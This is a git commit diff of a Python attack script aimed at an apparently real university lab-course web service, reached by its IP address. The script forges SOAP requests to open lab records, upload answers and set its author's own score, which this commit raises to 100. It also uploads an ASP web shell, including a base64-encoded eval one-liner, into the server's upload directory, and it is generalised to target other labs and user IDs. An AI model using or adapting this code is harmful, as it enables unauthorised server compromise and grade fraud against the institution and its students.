4459d790673ef4cc9f55867f0ac47082a470591a
dyf <843347859@qq.com>
2020-04-24 20:25:08 +0800

    add shell

--- fuck.py
+++ fuck.py
@@ -12,7 +12,7 @@ def info(dataType, data):
     return data
 
 
-def initFirst(userId):
+def initFirst(userId, labId):
     url = "http://118.184.217.73:7182/BizService.svc"
     headers = {"Content-Type": "text/xml; charset=utf-8",
                "SOAPAction": "http://www.ustcori.com/2009/10/IBizService/DoService",
@@ -25,7 +25,8 @@ def initFirst(userId):
               <MethodName>ucControlMethod</MethodName>
               <Parameters xmlns:a="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
               <a:KeyValueOfstringanyType><a:Key>ucControl</a:Key>
-              <a:Value i:type="b:string" xmlns:b="http://www.w3.org/2001/XMLSchema">{"ID":0,"LabID":364,"UserID":"''' + str(
+              <a:Value i:type="b:string" xmlns:b="http://www.w3.org/2001/XMLSchema">{"ID":0,"LabID":''' + str(
+        labId) + ''',"UserID":"''' + str(
         userId) + '''","ServiceID":"开始实验","StartTime":"\/Date(-62135596800000+0800)\/","OperType":0,"ServiceFlag":false,"ServiceNumber":0,"MaxFileTime":0}</a:Value></a:KeyValueOfstringanyType></Parameters></request></DoService></s:Body></s:Envelope>'''
 
     resp = requests.post(url=url, headers=headers, data=body.encode('utf-8'))
@@ -36,7 +37,7 @@ def initFirst(userId):
     return id
 
 
-def initSecond(userId):
+def initSecond(userId, labId):
     url = "http://118.184.217.73:7182/BizService.svc"
     headers = {"Content-Type": "text/xml; charset=utf-8",
                "SOAPAction": "http://www.ustcori.com/2009/10/IBizService/DoService", }
@@ -50,7 +51,8 @@ def initSecond(userId):
     <Parameters xmlns:a="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
     <a:KeyValueOfstringanyType><a:Key>labTime</a:Key>
     <a:Value i:type="b:string" xmlns:b="http://www.w3.org/2001/XMLSchema">{"ID":0,"USERID":"''' + str(
-        userId) + '''","LABID":364,"STARTTIME":"\/Date(-62135596800000+0800)\/","ENDTIME":"\/Date(-62135596800000+0800)\/","Mark":"1","LabDateUrl":null,"Score":0}</a:Value></a:KeyValueOfstringanyType></Parameters></request></DoService></s:Body></s:Envelope>'''
+        userId) + '''","LABID":''' + str(
+        labId) + ''',"STARTTIME":"\/Date(-62135596800000+0800)\/","ENDTIME":"\/Date(-62135596800000+0800)\/","Mark":"1","LabDateUrl":null,"Score":0}</a:Value></a:KeyValueOfstringanyType></Parameters></request></DoService></s:Body></s:Envelope>'''
 
     resp = requests.post(url=url, headers=headers, data=body.encode('utf-8'))
 
@@ -86,12 +88,12 @@ def initThird(userId):
         return False
 
 
-def sendFile(userId):
+def sendFile(userId, fileName):
     url = "http://118.184.217.73:7182/FileTransfer.svc"
     headers = {"Content-Type": "text/xml; charset=utf-8",
                "SOAPAction": "http://tempuri.org/IFileTransfer/UploadFile"}
 
-    with open("./answer.txt", "r") as f:
+    with open(fileName, "r") as f:
         answer = f.read()
         f.close()
 
@@ -108,13 +110,14 @@ def sendFile(userId):
         return False
 
 
-def setScore(userId, id, score):
+def setScore(userId, id, score, labId):
     url = "http://118.184.217.73:7182/BizService.svc"
     headers = {"Content-Type": "text/xml; charset=utf-8",
                "SOAPAction": "http://www.ustcori.com/2009/10/IBizService/DoService"}
     body = '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><DoService xmlns="http://www.ustcori.com/2009/10"><request xmlns:i="http://www.w3.org/2001/XMLSchema-instance"><BizCode>UstcOri.BLL.BLLLabClent</BizCode><EnableCache>false</EnableCache><MethodName>SetLabTimeRecord</MethodName><Parameters xmlns:a="http://schemas.microsoft.com/2003/10/Serialization/Arrays"><a:KeyValueOfstringanyType><a:Key>labTime</a:Key><a:Value i:type="b:string" xmlns:b="http://www.w3.org/2001/XMLSchema">{"ID":' + str(
         id) + ',"USERID":"' + str(
-        userId) + '","LABID":364,"STARTTIME":"\/Date(-62135596800000+0800)\/","ENDTIME":"\/Date(-62135596800000+0800)\/","Mark":"2","LabDateUrl":"Upload\\\\LabDate\\\\02-光栅单色仪实验\\\\' + str(
+        userId) + '","LABID":' + str(
+        labId) + ',"STARTTIME":"\/Date(-62135596800000+0800)\/","ENDTIME":"\/Date(-62135596800000+0800)\/","Mark":"2","LabDateUrl":"Upload\\\\LabDate\\\\02-光栅单色仪实验\\\\' + str(
         userId) + '_2020421224510.xml","Score":' + str(
         score) + '}</a:Value></a:KeyValueOfstringanyType></Parameters></request></DoService></s:Body></s:Envelope>'
     resp = requests.post(url=url, headers=headers, data=body.encode('utf-8'))
@@ -150,15 +153,16 @@ def writeShell():
     headers = {"Content-Type": "text/xml; charset=utf-8",
                "SOAPAction": "http://tempuri.org/IFileTransfer/UploadFile"}
 
-    with open("./a.asp", "r") as f:
+    with open("./shell.asp", "r") as f:
         shell = f.read()
         f.close()
-    payload = base64.b16encode(shell.encode())
-    f = "PCVldmFsIHJlcXVlc3QoImNob3BwZXIiKSU+"
-    info("answer", payload)
+    # payload = base64.b16encode(shell.encode())
+    # f = "PCVldmFsIHJlcXVlc3QoImNob3BwZXIiKSU+"
+    f = shell
+    info("answer", f)
     body = '''<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
         <s:Body><UploadFile xmlns="http://tempuri.org/">
-        <fileName>''' + str(41824125) + '''_2020421224510.asp</fileName><path>Upload\LabDate\\02-光栅单色仪实验</path>'''
+        <fileName>a.aspx</fileName><path>Upload\LabDate\\03-单缝衍射</path>'''
     body += "<content>" + f + "</content>" + "<append>false</append></UploadFile></s:Body></s:Envelope>"
     resp = requests.post(url=url, headers=headers, data=body.encode('utf-8'))
 
@@ -171,12 +175,16 @@ def writeShell():
 
 
 def main():
-    userId = 41824125
-    id1 = initFirst(userId)
-    id2 = initSecond(userId)
+    writeShell()
+    exit()
+    labId = 393
+    userId = 41824142
+    fileName = "./lab2.txt"
+    id1 = initFirst(userId, labId)
+    id2 = initSecond(userId, labId)
     status = initThird(userId)
-    serilizeStatus = sendFile(userId)
-    setScoreStatus = setScore(userId, id2, 60)
+    serilizeStatus = sendFile(userId, fileName)
+    setScoreStatus = setScore(userId, id2, 100, labId)
     flushStatus = flushState(id1)
 
 
